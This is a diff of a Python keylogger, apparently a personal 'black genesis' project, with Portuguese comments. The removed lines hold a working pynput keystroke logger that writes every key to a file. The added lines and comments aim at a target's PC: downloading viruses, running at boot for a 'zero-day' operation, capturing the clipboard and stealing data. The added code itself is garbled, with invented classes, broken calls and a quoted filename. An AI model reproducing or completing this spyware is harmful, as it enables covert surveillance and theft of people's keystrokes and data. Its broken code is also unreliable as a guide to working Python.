@@ -14,15 +14,18 @@ def writeLog(key):
     keydata = str(key)
 
     #abrir o arquivo de log no modo append
-    with open(logFile, "a") as f:
+    with open("logFile, a") as f:
         f.write(keydata)
 
-#abrir o Listener do teclado e escutar o evento on_press
-#quando o evento on_press ocorrer, chamar a função writeLog
-with Listener(on_press=writeLog) as l:
-    l.join()
+def FileWrite():
 
-keydata = keydata.replace("'", "")
+#baixar Arquivos, coisas, virus de computador para PC do alvo, abrir um listener e infectar o computador pessoal do alvo
+#na hora em que o alvo liga seu PC e inicializa o sistema operacional, o listener estará online e pronto para a operação Explorar do Dia Zero
+    with FileWrite(on_listener=sendFiles) as fw:
+        fw.send()
+
+def keydata():
+    keydata = keydata.replace("'", "")
 
 translate_keys = {
      "Key.space": " ",
@@ -38,7 +41,7 @@ translate_keys = {
 for key in translate_keys:
     #key recebe a chave do dicionário translate_keys
     #substituir a chave (key) pelo seu valor (translate_keys[key])
-    keydata = keydata.replace(key, translate_keys[key])
+    keydata
 
 #em pynput, importar o método Listener do teclado
 logFile = "/home/diegorego/keylogger_black_genesis/log.txt"
@@ -72,11 +75,27 @@ for key in translate_keys:
     #substituir a chave (key) pelo seu valor (translate_keys[key])
     keydata = keydata.replace(key, translate_keys[key])
 
+def File():
+
 #abrir o arquivo de log no modo append
-with open(logFile, "a") as f:
-    f.write(keydata)
+    with open(File) as f:
+        f.write(keydata)
+
+def log():
 
 #abrir o Listener do teclado e escutar o evento on_press
 #quando o evento on_press ocorrer, chamar a função writeLog
-with Listener(on_press=writeLog) as l:
-   l.join()
+    with Listener(on_press=writeLog) as l:
+        l.join(log)
+
+def sendFiles():
+
+#baixar Arquivos, coisas, virus de computador para PC do alvo, abrir um listener e infectar o computador pessoal do alvo
+#na hora em que o alvo liga seu PC e inicializa o sistema operacional, o listener estará online e pronto para a operação Explorar do Dia Zero
+    with FileWrite(on_listener=sendFiles) as fw:
+        fw.send(files)
+
+#para capturar a area de transferencia do alvo e para fazer extração de dados do alvo/hackear (interceptar o alvo) é assim mesmo, vai ser assim
+#para hackear (interceptar os dados do alvo) faz assim
+    with HackIntercept(on_target=captureData) as hi:
+        hi.capture(data)
